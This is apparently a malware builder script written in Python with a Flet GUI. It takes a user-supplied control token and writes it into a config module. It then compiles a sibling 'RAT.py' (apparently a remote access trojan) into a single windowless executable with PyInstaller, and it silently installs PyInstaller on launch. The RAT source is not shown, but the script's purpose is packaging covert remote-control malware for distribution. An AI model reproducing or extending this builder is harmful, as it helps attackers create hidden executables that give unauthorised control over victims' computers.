import flet as ft
import os
from pathlib import Path

os.system('pip install pyinstaller')

class Main():
    def main(page: ft.Page):
        def build(e):
            print(Path(__file__).parent.parent)
            os.chdir(Path(__file__).parent.parent)
            with open("varss.txt","r+") as f:
                f.write(f'TOKEN = "{tokenip.value}"')
                f.close
            os.rename('varss.txt','varss.py')
            ratpath = Path(__file__).parent.with_name('RAT.py')
            print(ratpath)
            os.system(f"pyinstaller --noconsole --hidden-import varss --onefile {ratpath}")
        tokenip = ft.TextField(value="TOKEN")
        button = ft.ElevatedButton(text='build',on_click=build)
        page.add(ft.Row([tokenip]))
        page.add(ft.Row([button]))
    ft.app(target=main)